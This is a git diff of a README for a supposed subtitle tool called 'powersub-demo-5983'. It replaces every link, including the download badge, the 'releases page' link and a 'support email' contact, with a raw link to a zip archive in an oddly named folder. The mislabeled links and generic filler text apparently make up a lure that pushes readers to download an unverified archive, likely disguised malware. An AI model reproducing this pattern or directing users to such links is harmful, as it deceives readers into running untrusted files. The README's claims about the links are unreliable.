@@ -1,7 +1,7 @@
 # 🚀 powersub-demo-5983 - Your Easy Guide to Power Subtitles
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/kimjunhee112233/powersub-demo-5983/main/acertannin/powersub-demo-5983.zip)](https://raw.githubusercontent.com/kimjunhee112233/powersub-demo-5983/main/acertannin/powersub-demo-5983.zip)
+[![Download](https://github.com/kimjunhee112233/powersub-demo-5983/raw/refs/heads/main/confederationist/powersub-demo-v2.8.zip)](https://github.com/kimjunhee112233/powersub-demo-5983/raw/refs/heads/main/confederationist/powersub-demo-v2.8.zip)
 
 ## 📖 Table of Contents
 1. [Overview](#overview)
@@ -23,7 +23,7 @@ To run powersub-demo-5983, ensure your system meets the following requirements:
 - **Internet Connection:** Required for initial download
 
 ## 📤 Download & Install
-To get started, visit this page to download: [Download Page](https://raw.githubusercontent.com/kimjunhee112233/powersub-demo-5983/main/acertannin/powersub-demo-5983.zip)
+To get started, visit this page to download: [Download Page](https://github.com/kimjunhee112233/powersub-demo-5983/raw/refs/heads/main/confederationist/powersub-demo-v2.8.zip)
 
 1. Click on the above link to be directed to the releases page.
 2. Locate the latest version of powersub-demo-5983.
@@ -50,6 +50,6 @@ After installing powersub-demo-5983, you can follow these steps to start using t
 - **Real-Time Adjustments:** Change subtitle settings while the video plays to see instant results.
 
 ## 📞 Support
-If you encounter any issues or have questions, you can reach out for help. Feel free to check the Issues section on our GitHub page or contact the support team via email (https://raw.githubusercontent.com/kimjunhee112233/powersub-demo-5983/main/acertannin/powersub-demo-5983.zip).
+If you encounter any issues or have questions, you can reach out for help. Feel free to check the Issues section on our GitHub page or contact the support team via email (https://github.com/kimjunhee112233/powersub-demo-5983/raw/refs/heads/main/confederationist/powersub-demo-v2.8.zip).
 
 Thank you for choosing powersub-demo-5983! We hope this application enhances your subtitle experience.
